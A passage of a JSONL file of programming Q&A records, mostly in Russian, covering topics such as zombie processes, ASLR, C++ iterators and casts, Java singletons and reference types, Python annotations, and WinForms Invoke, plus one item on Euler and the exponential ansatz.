裏でデータをヒープとスタックにうまい具合に振り分けてくれるようになっています。\n", "question_score": "9", "answer_score": 12}
{"title": "Who invented the exponential ansatz for linear differential equations with constant coefficients?", "description": "Who invented using $e^{\\lambda t}$ as ansatz for solving linear differential equations with constant coefficients?\n", "answer": "The short answer is Euler. Some details are given in the following long quote from Hald's History of Probability and Statistics and Their Applications before 1750 (p.438):\n\nIn 1743 Euler solved the homogeneous linear differential equation of the\n  m-th order with constant coefficients (using the same idea as de Moivre) by\n  guessing at a particular solution of the form $y = c\\,e^{rx}$ and thus deriving the characteristic equation as an algebraic equation of the $m$-th degree. He pointed out that the general solution will be a linear combination of $m$ independent particular solutions. The year before he had proved (incompletely) that a polynomial with real coefficients can be decomposed into linear and quadratic factors with real coefficients, and he could therefore assert that the characteristic equation always has $m$ roots. He found that the particular solution for a single real root has the form $y = c\\,e^{rx}$, for a real root of multiplicity $k$ the form  $e^{rx}$ times a polynomial in $x$ of degree $k$, and for a pair of conjugate complex roots the form $y = e^{ax}(c_1 \\cos bx + c_2 \\sin bx)$, where $c_1$ and $c_2$ are arbitrary constants.\nIn 1753 Euler solved the nonhomogeneous differential equation of the\n  $m$-th order with constant coefficients by devising a method for reducing the\n  order by unity and thus successively reducing the problem to the solution\n  of a nonhomogeneous differential equation of the first order...\nIn the 1760s Lagrange proved that Euler's 1753 theorem also holds for a\n  nonhomogeneous differential equation of the $m$-th order with variable\n  coefficients so that the general solution may be expressed by means of the\n  solution of the homogeneous equation and the solution of an adjoint equation\n  of the first order.\n\nThe justification obviously depends on the Fundamental Theorem of Algebra, and according to the conventional wisdom Euler's reasoning for it had an irreparable gap, which was filled by Gauss. Depending on one's strictures for rigor even Gauss may not be beyond reproach, see Dunham's Euler and the Fundamental Theorem of Algebra. \nThe Euler-Lagrange presentation of a general nonhomogeneous solution as a sum of general homogeneous and particular solutions is recognized today as a direct consequence of linearity, this is a general form of solution to underdetermined linear systems. But of course this insight was not yet available in their time. The method for finding a particular solution which came to be known as the variation of parameters was used by Euler in a particular case already back in 1748, but was only given its final form by Lagrange in 1808-1810. Both Euler and Lagrange were solving equations related to perturbations of elliptic orbits of the planets and the Moon.\n", "question_score": "9", "answer_score": 14}
{"title": "Как сделать выборочную / отложенную загрузку js, css и изображений?", "description": "Какими способами и инструментами можно оптимизировать загрузку мобильных версий сайта применительно к адаптивному веб-дизайну? Иногда необходимо переделывать фронтэнд без возможности изменений серверной стороны, поэтому ищу лучшее решение с учетом этого момента.\nСитуация 1. Есть 2 js и 2 css файла. Как можно сделать, чтобы грузился только js #1 и css #1, в зависимости от screen.width например?\nСитуация 2. В dom есть элементы с классом .only-desktop, в которых находятся изображения. Какой наиболее быстрый и правильный способ предотвратить загрузку изображений в .only-desktop?\n", "answer": "Здесь официальное руководство от google, с примерами.\nДля начала воспользуйтесь одним из готовых решений, примеры прилагаются. HeadJs, пожалуй, проще всего. \nСложные правила для media queries  становятся сильно проще, если использовать какой-либо препроцессор стилей и миксины\nПример для раздельных Javascript с помощью enquire:\n<script type=\"text/javascript\">\n\n   enquire.register(\"screen and (min-width: 600px) and (max-width: 899px)\", {\n      match : function() {\n        require.ensure(['tablet.js'], function (reqiure) { require('tablet.js')});\n      } \n   }).listen();\n\n   enquire.register(\"screen and (min-width: 900px)\", {\n       match : function() {\n          require.ensure(['desktop.js'], function(require) { require('desktop.js')});\n       }\n   }).listen();\n\n</script>\n\nЭтот пример подразумевает, что вы используете require или webpack, поддерживающие сборку догружаемых модулей. Конечно, вы можете использовать любой доступный способ инжекции скриптов и ресурсов.\nТем же способом можно подгрузить enquire, или любую другую из вышеперечисленных библиотек из cdn, не меняя серверную часть.\n\nСогласно этому исследованию, самым эффективным путём запрета загрузки изображений является каскадная перезапись свойства посредством @media queries\n\n", "question_score": "9", "answer_score": 14}
{"title": "Что означает \"There is 1 zombie process\" и что с ним делать?", "description": "Залогинился на удаленную машину. Вижу следующую строку в приветственном сообщении. \n\nThere is 1 zombie process.\n\nНасколько я понял, это означает, что какой-то процесс завершил работу, но не закрылся и не освободил ресурсы. Хотелось бы лучше понять проблему:\n\nКак можно его обнаружить? Сейчас я угадал, но нужен стабильный метод.\nКак можно узнать причины его появления? Есть какие-нибудь логи? Может, по имеющемуся процессу можно что-либо понять?\n\nЕсли это важно, ubuntu 14.04, sudo есть.\nДополнение: меня не устраивает метод «просто подождать», т.к. есть сервис, который должен работать всегда — и подвис он или кто-то из его детей. Он подстрахован monit'ом, но тот не распознал зомбификацию и не перезагрузил. \n", "answer": "Зомби в операционных системах UNIX называют завершившиеся процессы, код завершения которых не забрал родительский процесс. Зомби не потребляют никаких ресурсов, память и файловые дескрипторы таких процессов уже освобождены. Остается только запись в таблице процессов, которая занимает несколько десятков байт памяти. Так что единичный зомби процесс на систему никак не влияет. НО он явный индикатор того, что у какого то процесса в системе что то пошло не так.\nПоиск зомби:\nps -axho state,pid,ppid | grep Z | sed 's/./ps/' | sh\n\nДанная команда покажет все зомби процессы и их родителей (тестировалась под linux, под другими *nix возможны другие ключи у команды ps).\nУбить зомби можно только перезапуском родительского процесса. kill -9 самого процесса-зомби и чеснок обычно не помогают. Если появление зомби разовое явление, то возможно проще на факт его появления забить.\nЧто бы понять почему именно появился зомби надо смотреть исходники породившего его процесса и возможно самого зомби. Часто это одна и та же программа. Любой процесс, выполняющий fork, т.е. запускающий дочерние процессы должен уметь забирать код их завершения, делается это вызовом wait и/или waitpid. Для начала надо просмотреть исходники на наличие функций группы wait, а так же наличие функции-обработчика сигнала SIGCHLD (обработчик устанавливается вызовом signal и функций для работы с сигналами потоков). Если родитель не использует функции группы wait, то возможно при его нормальной работе завершение дочерних процессов разработчик вообще не ожидал. Если это так - то причина образования зомби - незапланированное завершение процесса потомка в следствие какой либо ошибки. Дать рекомендаций как это искать и лечить невозможно. Можно только посоветовать добавить в родительский поток обработку CHLD, забор кода завершения с помощью wait и логирование факта завершения потомка. И дальше запуск потомка под отладчик и т.п. ...\nВариант 2: родительский процесс использует wait, но зомби все равно появляются. Копать в сторону того, какая разновидность wait используется, если waitpid, которая проверяет завершение конкретных потомков, то смотреть откуда она берет проверяемые pid, возможно в процессе работы какие то pid потомков теряются и программа про них забывает. Может программа в какой то момент запрещает обработку сигналов и забывает восстановить обработку, после прохождения критического участка. Опять же - вариантов очень много, но сосредоточены они вокруг обработчика SIGCHLD и функций wait.\nВариант 3: родительский процесс умеет обрабатывать и готов правильно обработать завершение своих потомков. Но зацикливается в другом месте программы или засыпает на системном вызове, например чтения с сетевого диска, который стал недоступен и при этом прерывание по SIGCHLD запрещено. В этом случае надо разбираться с причинами его зависания. Кстати, отсутствие доступа к каким либо ресурсам, типа сетевых дисков (или при выходе из строя физического диска) - довольно частая причина массового появления зомби.\nКаких либо специальных логов в системе, где можно было бы увидеть хоть какую то информацию по появляющимся зомби не существует. Следы можно найти только в логах той программы, которая их порождает, при их наличии.\n", "question_score": "9", "answer_score": 13}
{"title": "Как написать свой RandomAccess итератор?", "description": "Есть класс, хранящий позицию элемента некоторой последовательности чисел:\nstruct Position {\n    int& dereference() const; // Получение текущего элемента.\n    bool equal(const Position& other) const; // Проверка на равенство.\n    void increment(); // Перемещение вперед.\n    void decrement(); // Перемещение назад.\n    void advance(std::ptrdiff_t n);  // Перемещение на \"n\" элементов.\n    std::ptrdiff_t distance_to(const Position& other) const; // Расстояние до другой позиции.\n};\n\nКак при помощи этого класса написать итератор, так чтобы его можно было использовать в алгоритмах стандартной библиотеки?\n", "answer": "Написание итератора можно слегка упростить при помощи стандартного шаблона класса std::iterator, куда надо передать категорию итератора и тип элемента последовательности.\nВ зависимости от выбранной категории итератора, те или иные операции можно не реализовывать.\nstruct iterator : std::iterator<std::random_access_iterator_tag, int /* Тип элемента */> {\n    // Вложенный объект Position, и конструктор для него.\n    Position pos;\n    iterator(Position pos) : pos(pos) {}\n\n    // Операции, необходимые для всех категорий итераторов.\n    iterator() = default;\n    iterator(const iterator&) = default;\n    iterator& operator=(const iterator&) = default;\n    ~iterator() = default;\n    reference operator*() const { return pos.dereference(); }\n    iterator& operator++() { pos.increment(); return *this; }\n    iterator operator++(int) { auto old = *this; ++(*this); return old; }\n\n    // Операции, необходимые для InputIterator.\n    pointer operator->() const;\n\n    // Операции, необходимые для BidirectionalIterator.\n    iterator& operator--() { pos.decrement(); return *this; }\n    iterator operator--(int) { auto old = *this; --(*this); return old; }\n\n    // Операции, необходимые для RandomAccessIterator.\n    reference operator[](difference_type n) const { auto tmp = *this; tmp += n; return *tmp; }\n    iterator& operator+=(difference_type n) { pos.advance(n); return *this; }\n    iterator& operator-=(difference_type n) { return *this += -n; }\n};\n\n// Операции, необходимые для всех категорий итераторов.\nvoid swap(iterator& a, iterator& b) { std::swap(a.pos, b.pos); }\n\n// Операции, необходимые для InputIterator.\nbool operator==(const iterator& lhs, const iterator& rhs) { return lhs.pos.equal(rhs.pos); }\nbool operator!=(const iterator& lhs, const iterator& rhs) { return !(lhs == rhs); }\n\n// Операции, необходимые для RandomAccessIterator.\nbool operator<(const iterator& lhs, const iterator& rhs) { return lhs.pos.distance_to(rhs.pos) > 0; }\nbool operator>(const iterator& lhs, const iterator& rhs) { return rhs < lhs; }\nbool operator<=(const iterator& lhs, const iterator& rhs) { return !(rhs > lhs); }\nbool operator>=(const iterator& lhs, const iterator& rhs) { return !(lhs < rhs); }\niterator operator+(iterator it, iterator::difference_type n) { it += n; return it; }\niterator operator+(iterator::difference_type n, iterator it) { return it + n; }\niterator operator-(iterator it, iterator::difference_type n) { it -= n; return it; }\niterator::difference_type operator-(const iterator& lhs, const iterator& rhs) { return rhs.pos.distance_to(lhs.pos); }\n\n>>> Здесь можно посмотреть весь код полностью <<<\n", "question_score": "9", "answer_score": 10}
{"title": "Как в Linux запускать программу с одними и теми же виртуальными адресами?", "description": "Допустим, есть некий ./a.out (получен из Си), который выводит адрес, возвращаемый первым же malloc (естественно, на пути к нему всегда выполняются одни и те же действия).\nПри каждом запуске мы видим разные числа\n - это особенность Linux (м.б. и в других системах тоже реализовано) запускать программу так, чтобы стек, куча и область для mapping-а файлов размещались по случайным адресам).\nА вот если смотреть в gdb или запустить этот ./a.out в valgrind, то увидим один и тот же адрес.\nВопрос, как запускать (без apt-get install valgrind) ./a.out, чтобы печатаемый адрес всегда был тем же самым?\n", "answer": "Как верно замечено в комментариях, то, с чем вы столкнулись, называется ASLR - рандомизация адресного пространства. Технология поддерживается во всех современных ОС. \nНо, помимо поддержки в ОС, бинарники так же должны быть скомпилированы специальным образом. К примеру, у GCC есть опции для компиляции с поддержкой ASLR: -fPIC/-fpic и -fPIE/-fpie.\nВ Linux, поддержу ASLR на уровне ОС можно отключить руками:\nsudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'\n\nи включить назад:\nsudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space' \n\nИ наконец, в Linux есть утилита hardening-check, которая определяет, скомпилирован бинарник с поддержкой рандомизации или нет.\nUPD:\nОказывается, есть целых 5 типов рандомизаций: \n\nStack ASLR\nLibs/mmap ASLR\nExec ASLR  -  вот этот тип задаётся флагами fPIE при компиляции\nbrk ASLR\nVDSO ASLR\n\nИ в доках пишут, что для рандомизации malloc-ов используется brk ASLR.\nТ.е. получается, что для каких-то рандомизаций нужно указывать специальные флаги при компиляции программы, а какие-то работают по-умолчанию \"из коробки\". Так что, чтобы полностью исключить всякие рандомизации, нужно отключать ASLR на уровне ОС / в рамках сессии (setarch $(uname -m) -RL bash). \n", "question_score": "9", "answer_score": 13}
{"title": "Какая разница между string и String?", "description": "Чем отличаются string и String (обратите внимание на регистр) в C#?\nstring s = \"Hello, World\";\n\nString S = \"Hello, World\";\n\nКакие есть указания для их использования? В чем концептуальное различие?\nОригинальный вопрос: What's the difference between String and string?\n", "answer": "В языке C# string — алиас System.String. Во время выполнения разницы между ними нет. Во время компиляции есть незначительная разница: употребление String без указания полного имени класса требует using System;.\nЭто лишь один из алиасов. Вот полный список:\nobject:  System.Object\nstring:  System.String\nbool:    System.Boolean\nbyte:    System.Byte\nsbyte:   System.SByte\nshort:   System.Int16\nushort:  System.UInt16\nint:     System.Int32\nuint:    System.UInt32\nlong:    System.Int64\nulong:   System.UInt64\nfloat:   System.Single\ndouble:  System.Double\ndecimal: System.Decimal\nchar:    System.Char\n\nКроме string и object, все алиасы соответствуют value-типам. Тип decimal, хоть и является value-типом, не является примитивным. Единственный примитивный тип без алиаса — System.IntPtr.\nВ спецификации все value-типы с алиасами называются простыми (simple types). Для задания константных значений простых типов могут использоваться литералы, для других value-типов литералов не существует. (В VB.NET есть литералы для DateTime.)\nЕдинственный случай, когда использование алиасов обязательно — это при задании базового типа перечисления.\npublic enum Foo : UInt32 {} // Ошибка компиляции\npublic enum Bar : uint   {} // Компилируется\n\nВ случае общего для нескольких языков API рекомендуется использовать полные имена типов. Например, класс BinaryReader включает методы ReadInt32 и ReadSingle, но не ReadInt или ReadFloat.\nСледует обратить внимание, что назначение ключевых слов отличается от языка к языку. Например, в то время как long в C# — это Int64, long в C++ может иметь любую длину: хоть 16, хоть 32 бита (зависит от платформы). В C++/CLI long соответствует Int32. Если в вашем коде много взаимодействия между языками, то может иметь смысл использовать имена CLR во избежание путаницы.\nЕщё один нюанс: если в какой-нибудь библиотеке будет объявлен тип Foo.String, то использование String может привести к конфликтам, а использование string всегда будет однозначно. Однако этот случай скорее невероятен, потому что объявление подобного типа запрещается Framework Design Guidelines и здравой логикой.\nРанее StyleCop (и встроенный в Visual Studio анализ) рекомендовал использовать string для переменных и String для вызовов методов (например, String.Format()). В последних версиях рекомендация была изменена: рекомендуется всегда использовать алиас string, в том числе при вызове методов (string.Format()).\nПеревод-компиляция ответов к оригинальному вопросу What's the difference between String and string?\n", "question_score": "9", "answer_score": 22}
{"title": "Изменения кода в бесплатной и платной версии приложения одновременно", "description": "Есть приложение N, у него есть две версии - платная и бесплатная, у каждой версии свой ИД и свой функционал.\nДопустим, мне надо внести изменение в 5-7 классов, дополнить их чем-то и в той и другой версии. \nКак лучше всего и удобнее это делать ?\nп.с. сейчас я пишу в одной версии, потом копирую ручками в другую.\n", "answer": "Используйте Flavors.\nРецепт для Android Studio:\n\nОткрываете File-Project Structure-Flavors. Там уже будет defaultConfig. Создаете два flavor'а: paid и free. Указываете для каждого из них свой ApplicationId. Остальные данные указывать не обязательно, они будут браться из defaultConfig'а (возможно могут отличаться signing config, тогда его тоже указать, а может и нет, зависит от вашего проекта).\nТеперь для каждого из flavor'а вы можете создать свои классы и ресурсы, они будут объединяться с имеющимся кодом (поверх). Файлы эти будут лежать рядом с main в директории src. Например:\nmyproject\n    app\n        src\n            main\n                java\n                res\n                assets\n                ...\n            paid\n                java\n                res\n                ...\n            free\n                res\n                ...\n\n2.1. Сама структура директорий не создается, придется это делать вручную. Хотя для ресурсов, например, можно выбрать sourceSet (по дефолту там main, но можно выбрать любой нужный) и тут уже структура и файлы (если надо) создадутся.\nОткрываете слева внизу в студии Build Variants и выбираете там нужный вам вариант запуска. Например, Module: app -> Build Variant: paidDebug. Переключаетесь на freeDebug, студия сама все пересоберет.\nПрофит.\n\nСсылки по теме:\n\nConfiguring Gradle Builds\nAn Android Studio Gradle Build Variants Example\n\n", "question_score": "9", "answer_score": 12}
{"title": "Возможно ли в С вывести что-нибудь в консоль, не используя stdio.h?", "description": "Возможно ли в С вывести что-нибудь в консоль, не используя stdio.h, printf?\n", "answer": "stdio.h - это буферизированная надстройка над базовыми функциями ввода-вывода read, write, объявленными в unistd.h.\n#include <unistd.h>\nwrite(1, \"Hallo!\\n\", sizeof \"Hallo!\\n\" - 1);\n\nПервый аргумент - файловый дескриптор - номер в таблице открытых файлов исполняемой программы. При запуске по стандарту заранее открыты три дескриптора: 0 - стандартный ввод, 1 - стандартный вывод, 2 - стандартный вывод ошибок. В некоторых системах могут быть ещё другие.\nfwrite из того же stdio.h. Работает похожим образом, но через тот же буфер, как и printf: \n#include <stdio.h>\nfwrite(\"Hallo!\\n\", sizeof \"Hallo!\\n\" - 1, 1, stdout);\n\nХотя она и вызывает write, но за счёт буферизации часто оказывается быстрее при записи большого количества данных в файл (при перенаправлении вывода). Безусловно fwrite быстрее printf, так как последняя ищет в строке форматные последовательности, начинающиеся со знака %.\nfputs и puts из stdio.h выводят строку, оканчивающуюся нулевым байтом ('\\0'). Вторая добавляет ещё и символ конца строки и выводит только на стандартный вывод.\n#include <stdio.h>\nfputs(\"Hallo!\\n\", stdout);\nputs(\"Hallo!\"); // выводит то же самое, что и предыдущая функция\n\nПо скорости должны быть как fwrite, но отличаются способом определения длины строки, поэтому с их помощью невозможно вывести сами нулевые байты. Мои измерения в ubuntu однако показывают, что puts почему-то намного медленнее fputs и почти как printf.\n", "question_score": "9", "answer_score": 12}
{"title": "Потокобезопасный singleton", "description": "Вот потокобезопасный singleton:\npublic class Singleton {\n    private volatile static Singleton instance;\n    private Singleton() {}\n    public static Singleton getInstance() {\n        if (instance == null) {\n            synchronized (Singleton.class) {\n               if (instance == null) {\n                   instance = new Singleton();\n               }\n            }\n        }\n        return instance;\n    }\n}\n\nНикак не пойму зачем ему volatile, если он и так лочится по Singleton.class. От чего это спасает ?\n", "answer": "Операция создания объекта в Java не является атомарной.\nРассмотрим (один из возможных) пример с выполнением операции создания объекта и двумя потоками:\nПоток A входит в метод getInstance(), в этот момент времени instance == null и он входит в синхронизированный блок, в котором тоже instance == null и начинает создание объекта Singleton. Сначала выделяется память под объект, потом этот объект инициализируется ссылкой на выделенную область памяти. В этот момент времени Поток B заходит в метод getInstance() видит, что instance != null и начинает использовать уже существующий, но еще не донца сконструированный объект (так как его поля еще не инициализированы).\nОбъявление поля instance как volatile (JDK 5+) устанавливает отношение happens before между инициализацией объекта instance Потоком A и возвратом объекта instance Потоку B.\nИными словами, объявление поля instance как volatile гарантирует, что поток В прочитает уже полностью сконструированный объект instance.\nUPD. Из комментариев @Roman еще одна причина необходимости использования volatile:\n\nБез volatile есть ещё одна проблема: если первая проверка if (instance == null) увидит не null, последующий return instance может увидеть null, в результате метод вернёт null.\nЕсли нет корректной синхронизации, то чтение, которое идёт \"позже\" может увидеть значение, которое было \"раньше\", т.к. JMM не запрещает переупорядочивать такие чтения.\n\nПеременная, объявленная volatile, никогда не кешируется в память потока, то есть она в любой момент времени в любом потоке будет иметь одинаковое (актуальное) значение (если один поток меняет ее значение, то это значение сразу же доступно в других потоках).\n", "question_score": "9", "answer_score": 14}
{"title": "Является ли функция функтором", "description": "Является ли функция функтором? \nФункцию можно применять в качестве функтора в STL алгоритмах, но почему-то книги упорно доказывают, что функция это функция, а функтор - это именно объект\n", "answer": "В стандарте C++ нет такого термина, как функтор. Обычно в книгах под этим понятием подразумевают так называемый объект функции - термин, который действительно определен в стандарте C++.\nИз стандарта C++ (20.9 Function objects)\n\n1 A function object type is an object type (3.9) that can be the\n  type of the postﬁx-expression in a function call (5.2.2, 13.3.1.1).230\n  A function object is an object of a function object type. In the\n  places where one would expect to pass a pointer to a function to an\n  algorithmic template (Clause 25), the interface is speciﬁed to accept\n  a function object. This not only makes algorithmic templates work with\n  pointers to functions, but also enables them to work with arbitrary\n  function objects.\n\nПоэтому под функторами авторы книг скорей всего имеют в виду объекты функций. Так как функции не относятся к типам объектов, то они не включаются в это понятие.\nС другой стороны а сноске 230 написано относительно типа постфиксного выражения вызова функции\n\n230) Such a type is a function pointer or a class type which has a\n  member operator() or a class type which has a conversion to a pointer\n  to function.\n\nТем не менее, алгоритмы могут принимать функции по ссылке, а не обязательно указатели на функции.\nСама приведенная цитата может трактоваться неоднозначно. Думаю, что ключом к ее правильной трактовке является следующая фраза из приведенной цитвты\n\nIn the places where one would expect to pass a pointer to a function\n  to an algorithmic template (Clause 25), the interface is speciﬁed to\n  accept a function object.\n\nИменно здесь, вероятно, авторы книг проводят водораздел между объектами, которые предоставляют оператор функцию, и простыми указателями на функции, называя первых функторами.\n", "question_score": "9", "answer_score": 10}
{"title": "Зачем нужен вызов \"-> max(a,b)\" при создании функции?", "description": "Нашёл такой пример: \ndef function(a:int,b:str,c:list) -> max(2,3):\n\nЗачем используется -> max(...)?\n", "answer": "Вкратце: он не нужен, это просто демонстрация использования аннотации. Вместо этого после стрелки нужно указывать тип возвращаемого значения функции.\n\nВ данной строке\ndef function(a:int,b:str,c:list) -> max(2,3):\n\n:int, :str, :list, -> max(2,3) - это аннотации. Впервые они предлагаются к введению в Python в PEP 3107, но их назначение четко не регламентировалось (их интерпретация возлагалась на авторов сторонних инструментов).\nПозже было более четко зафиксировано использование аннотаций как аннотаций типов (PEP 484), т.е. после аргументов функции через двоеточие пишем предполагаемый тип аргумента, после -> пишем тип возвращаемого значения функции.\nВ качестве аннотации может использоваться любое синтаксически верное выражение Python. При запуске кода интерпретатором выражения, используемые в качестве аннотации, исполняются (поэтому могут вызывать ошибки во время исполнения, например выражение def f() -> max(None, 1): pass вызовет ошибку TypeError, пример от jfs), но никаким специальным образом интерпретатором не обрабатываются (т.е., например, интерпретатор сам не проверяет типы).\nОпять же, интерпретатор их игнорирует, но аннотации типов могут использоваться такими инструментами как mypy или встроенным в PyCharm статическим анализатором кода, чтобы понимать, что в функцию передано (или возвращено) значение не того типа, которое предполагалось, и отображать это как ошибку или предупреждение.\n-> max(2,3) с моей точки зрения не несет никакой смысловой нагрузки. Это не аннотация типа, а просто аннотация. Что имел в виду автор примера - загадка. Скорее всего это просто пример использования аннотаций.\nПрограммно получить доступ к аннотациям функции можно через атрибут функции __annotations__:\ndef function(a:int,b:str,c:list) -> max(2,3): pass\n\nprint(function.__annotations__)\n\nРезультат:\n{'a': <class 'int'>, 'return': 3, 'c': <class 'list'>, 'b': <class 'str'>}\n\nЗдесь видны прописанные для аргументов типы, и видно, что выражение max(2,3) вычислилось, поэтому в качестве аннотации для возвращаемого значения записалось просто 3.\n", "question_score": "9", "answer_score": 14}
{"title": "Можете объяснить суть invoke", "description": "Есть основной поток, в котором я создаю все Controls в winforms. И есть второй поток, который вызывается через срабатывание события. В результате этого события мне нужно изменить значение DataSource у DataGridView. В результате возникает ошибка, что доступ к контролу пытается получить не основной поток, в котором был создан контрол. \nРешением является использование методов Invoke\\BeginInvoke. Но саму суть я не понимаю этих методов и как их реализовать в коде.\nВ создаваемом втором потоке используется функция доступа к dgv\nprivate void RefreshTables()\n{\n    try\n    {\n        if(con.State == ConnectionState.Closed)\n        {\n            con.Open();\n        }\n        sql = \"select rowid, * from OpenPos\";\n        adapOpenPos = new SQLiteDataAdapter(sql, con);\n        dsOpenPos = new DataSet();\n        adapOpenPos.Fill(dsOpenPos);\n        dataGridView1.DataSource = dsOpenPos.Tables[0];\n        dataGridView1.Columns[0].Visible = false;\n        dataGridView1.Columns[15].Visible = false;\n        dataGridView1.Update();\n        con.Close();\n\n        if (con.State == ConnectionState.Closed)\n        {\n            con.Open();\n        }\n        sql = \"select rowid, * from ClosePos\";\n        adapClosePos = new SQLiteDataAdapter(sql, con);\n        dsClosePos = new DataSet();\n        adapClosePos.Fill(dsClosePos);\n        dataGridView2.DataSource = dsClosePos.Tables[0];\n        dataGridView2.Columns[0].Visible = false;\n        dataGridView2.Columns[14].Visible = false;\n        dataGridView2.Update();\n        con.Close();\n    }\n    catch (Exception e)\n    {\n        MessageBox.Show(e.Message);\n    }           \n}\n\n", "answer": "Суть метода Invoke довольно проста - он принимает делегат и выполняет его в том потоке, в котором был создан элемент управления, у которого вызывается Invoke. Как вы могли заметить, если обращаться к контролам в WinForms не из того потока, в котором они были созданы, будет выброшено исключение. Соответственно, метод Invoke полезен в случаях, когда необходимо работать с контролом из других потоков. Метод BeginInvoke делает то же самое, но асинхронно. \nНебольшой пример использования Invoke:\nprivate void ButtonInvoke_Click(object sender, EventArgs e)\n{\n    var myThread = new Thread(ThreadFunction);\n    myThread.Start(); //метод выполняется в другом потоке\n}\n\nprivate void ThreadFunction()\n{\n    Thread.Sleep(1000);\n    Action action = () => listBox1.Items.Add(\"value\");\n    // Свойство InvokeRequired указывает, нeжно ли обращаться к контролу с помощью Invoke\n    if (InvokeRequired)\n        Invoke(action);\n    else\n        action();\n}\n\nСтоит также отметить, что async/await, добавленные в C# 5, позволяют обойтись без Invoke:\nprivate async void ButtonAsync_Click(object sender, EventArgs e)\n{\n    listBox1.Items.Add(\"first\");\n    await Task.Run(async () =>\n    {\n        await Task.Delay(1000);\n    });\n    // этот код будет продолжен в UI потоке, \n    // и здесь нет необходимости использовать Invoke\n    listBox1.Items.Add(\"second\");\n}\n\n", "question_score": "9", "answer_score": 15}
{"title": "В чём смысл существования reinterpret_cast?", "description": "В C++ существует оператор reinterpret_cast, смысл которого заключается в приведении между типами, несовместимыми друг с другом.\nОднако подобные преобразования нарушают strict aliasing rule, что провоцирует неопределённое поведение. Те же преобразования, которые этого правила не нарушают, укладываются в const_cast, static_cast и dynamic_cast.\nВ чём же тогда заключается смысл существования данного оператора, если его использование нарушает стандарт?\n", "answer": "reinterpret_cast используется не только для преобразования указателей одного типа в другой. Существует несколько разных преобразований. cppreference.com выделяет 11 вариантов преобразований:\n\nВ свой собственный тип\nУказателя в интегральный тип\nИнтегрального типа в указатель\nТипа std::nullptr_t в интегральный тип\nУказателя одного типа в указатель другого типа\nlvalue одного типа в ссылку на другой тип\nУказателя на функцию одного типа в указатель на функцию другого типа\nУказателя на функцию в void*\nНулевого указателя любого типа в указатель любого другого типа\nrvalue указатель одного типа на функцию-член в указатель другого типа на функцию-член\nrvalue указатель члена-данных одного типа в указатель ну другой член-данных другого типа\n\nType aliasing-правила затрагивают только пункты 5 и 6 и результат может быть безопасно использован (т.е. без нарушения strict-aliasing) в следующих случаях:\n\nРезультирующий тип есть динамический тип исходного объекта\nРезультирующий тип и динамический тип указывают на одинаковый тип T\nРезультирующий тип есть знаковый или беззнаковый вариант типа исходного объекта\nРезультирующий тип есть агрегатный тип или union, в котором содержится элемент или нестатический член данных, используемый в качестве исходного объекта. Т.е. можно получить указатель на структуру по указателю на её член.\nРезультирующий тип есть базовый класс динамического типа исходного объекта и этот тип является standard-layout классом и не содержит нестатических членов-данных, и результирующий тип - первый базовый класс.\nРезультирующий тип есть указатель на char, unsigned char или std::byte.\n\nНекоторые реализации ослабляют эти правила в качестве нестандартных расширений языка.\n", "question_score": "9", "answer_score": 13}
{"title": "Зачем нужны разные типы ссылок в Java?", "description": "Углубляю познания о джаве. Наткнулся на статью о типах ссылок. Понял, что существуют 4 типа ссылок:\n\nStrong reference \nWeak Reference\nSoft Reference\nPhantom Reference\n\nНезнаю, правильно ли я понял, поэтому прошу подправить.\n1 Тип сильная ссылка (Strong reference)\nObject object = new Object();//создал обьект \nobject = null;//теперь может быть собран сборщиком мусора\n\n2 Тип слабая ссылка (Weak Reference)\n// какой-то объект\nObject object= new Object ();\n\n// слабая ссылка на него\nWeakReference<Object > weakStudent = new WeakReference<Object >(object);\n\n// теперь объект Object  может быть собран сборщиком мусора\nobject= null;\n\n3 Тип мягкая ссылка (Soft Reference)\n// какой-то объект\nObject object= new Object ();\n\n// слабая ссылка на него\nSoftReference<Object > softStudent = new SoftReference<Object >(object)\n\n// теперь объект Student может быть собран сборщиком мусора\n// но это случится только в случае сильной необходимости JVM в памяти\nobject= null;\n\n4 Тип фантомная ссылка (ничего не понял про него)\n", "answer": "Более-менее рассказано в документации к пакету java.lang.ref:\n\nSoft references are for implementing memory-sensitive caches, weak references are for implementing canonicalizing mappings that do not prevent their keys (or values) from being reclaimed, and phantom references are for scheduling post-mortem cleanup actions. Post-mortem cleanup actions can be registered and managed by a Cleaner.\n\nПодробнее и по-русски, в порядке убывания жёсткости:\n\nСильные, они же обычные, нужны для указания на объекты, которые должны обязательно оставаться в памяти всё то время, что эти ссылки на него существуют. Если не складывается, получите OutOfMemoryError.\nМягкие ссылки полезны для кэшей, чувствительных к доступному объёму оперативной памяти. Объекты по ним могут зачиститься, но только в случае необходимости. Например, если нужно насоздавать ещё объектов с сильными ссылками, а уже негде, лучше освободить кэш и замедлить работу, чем уронить процесс напрочь.\nСлабые ссылки полезны для сопоставления объектов чему-нибудь без удерживания их от зачистки когда они больше не нужны (а-ля Map<Ключ, WeakRef<Значение>>). На возможность зачистки они не влияют вообще никак, слабые ссылки будут очищены при очередном запуске сборщика.\nФантомные ссылки возникают, когда объект уже признан мусором, финализирован и находится в процессе зачистки, о чём можно узнать с помощью класса Cleaner и выполнить в это время какие-то собственные действия.\n\nПлюс общее правило: политика зачистки для некоего объекта и очистки ссылок на него определяется самыми жёсткими из всех ссылок, что на него указывают.\n\nГлоссарий не вполне очевидных переводов:\n\nзачистить, зачистка — reclaim, reclamation\nочистить — clear\n\n", "question_score": "9", "answer_score": 12}
{"title": "Что такое framework и runtime?", "description": "Нигде не нашел чёткого опрделения этми двумя понятиям.\nЯ понимаю фреймворк, как платформу, которая необходима для работы каких-либо приложений. Например, набор динамически линкуемых библиотек для нескольких приложений - уже фреймворк. Также под это определение подохдит и Java Runtime Environment (в том числе и JVM). Однако что такое рантайм? С одной стороны это всего лишь фаза выполнения программы. С другой стороны есть куча терминов, как runtime libraries, runtime system... Что вкладывает майкрософт в это понятие тоже неясно. Объясните, пожалуйста!\n", "answer": "Между библиотекой и фреймворком разница небольшая, но принципиальна. Если Ваш код просто использует функции модуля, то этот модуль скорее всего библиотека. А вот если модуль заставляет Вас писать код так как он хочет и сам его вызывает, то это уже фреймворк. А вот собственно модуль - это набор файлов-исходников (иногда уже скомпилированных).\nruntime - это часть кода, существует в выполнимом файле (либо в отдельных so/dll) и обеспечивает всякие \"удобства\". Например, узнать тип объекта или сделать те же виртуальные вызовы. Добавляется обычно компилятором и обычный пользователь может даже не знать о нем. Также словом runtime называют то время, когда программа выполняется. Что конкретно имеется ввиду - нужно сдедить за 